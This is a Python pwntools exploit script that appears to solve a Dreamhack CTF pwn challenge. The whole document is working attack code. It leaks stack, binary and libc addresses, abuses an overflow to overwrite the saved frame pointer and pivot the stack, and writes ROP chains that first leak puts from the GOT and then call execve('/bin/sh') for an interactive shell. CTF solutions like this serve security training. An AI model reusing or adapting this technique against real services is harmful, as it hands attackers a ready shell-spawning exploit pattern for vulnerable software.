from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 17573
r = remote(HOST, PORT)

def encrypt(x):
    r.sendlineafter(b'> ', b'1')
    r.sendafter(b'? ', x)

def decrypt(x):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'? ', x)

def convert(val):
    dec = 0
    local = val
    for i in range(6):
        dec |= ((local & 0xff) + 3) << 8*i
        local = local >> 8
    return dec

def w(addr, data):
    rbp = addr
    for i in range(0, len(data), 2):
        encrypt(b'A'*0x8f + b'\x00' + p64(rbp+2) + b'\x9b')
        r.sendafter(b'? ', data[i:i+2])
        rbp += 2

encrypt(b'A'*0x80)
r.recvuntil(b': ')
r.recvuntil(b'3e'*0x80)

stack = int(r.recvline().strip(),16)
stack = int(bytes.fromhex(hex(stack)[2:])[::-1].hex(),16)
stack = convert(stack)

encrypt(b'A'*0x88)
r.recvuntil(b': ')
r.recvuntil(b'3e'*0x88)
binary = int(r.recvline().strip(),16)
binary = int(bytes.fromhex(hex(binary)[2:])[::-1].hex(),16)

binary = convert(binary) - 0x1249
pop_rdi_rbp = binary + 0x132e
puts_plt = binary + 0x10d0
puts_got = binary + 0x3f90
main = binary + 0x124e
leave = binary + 0x12d2
rbp = (stack+0x100) & ~0xf

payload = flat([
    0,
    pop_rdi_rbp,puts_got,0,
    puts_plt,
    main
])
w(rbp, payload)
encrypt(b'A'*0x8f + b'\x00' + p64(rbp) + b'\xd2')

r.recvline()
r.recvline()
libc = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x80e50
pop_rsi = libc + 0x2be51
pop_rdx = libc + 0x796a2
binsh = libc + 0x1d8678
execve = libc + 0xeb080

payload = flat([
    0,
    pop_rdi_rbp,binsh,0,
    pop_rsi,0,
    pop_rdx,0,
    execve
])
w(rbp+0x100, payload)
encrypt(b'A'*0x8f + b'\x00' + p64(rbp+0x100) + b'\xd2')

r.interactive()